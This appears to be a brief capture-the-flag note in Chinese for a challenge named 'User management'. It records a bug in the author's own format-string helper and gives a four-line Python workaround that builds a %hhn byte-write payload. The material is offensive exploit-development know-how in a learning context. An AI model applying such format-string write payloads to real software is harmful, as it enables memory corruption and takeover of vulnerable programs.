---
date: 2024-07-29 06:49
challenge: User management
tags:
  - strfmt
---

这道题让我发现了我的 strfmt 写得有问题，在连续布置 0xff 时会出现错位的情况，暂时先这么用吧：

```python
payload += fmt.generate_hhn_payload(0xC8 - 8 * 0, 0xFF)
payload += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 1, 0xFF - 1)
payload += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 2, 0xFF - 2)
payload += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 3, 0xFF - 3)
```
